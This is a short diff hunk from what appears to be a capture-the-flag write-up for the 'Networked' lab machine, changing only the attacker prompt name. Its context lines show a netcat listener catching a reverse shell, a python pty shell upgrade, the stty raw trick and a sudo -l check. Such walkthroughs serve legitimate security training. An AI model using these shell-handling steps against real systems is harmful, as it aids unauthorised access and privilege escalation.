@@ -255,7 +255,7 @@ guly
 python -c "import pty; pty.spawn('/bin/bash')"
 [guly@networked ~]$ ^Z
 [1]+  Stopped                 nc -nlvp 9696
-[10.10.14.43]-kali@kali:~$ stty raw -echo;fg
+[10.10.14.43]-bibo318@parrot:~$ stty raw -echo;fg
 nc -nlvp 9696
              export TERM=xterm
 [guly@networked ~]$ sudo -l
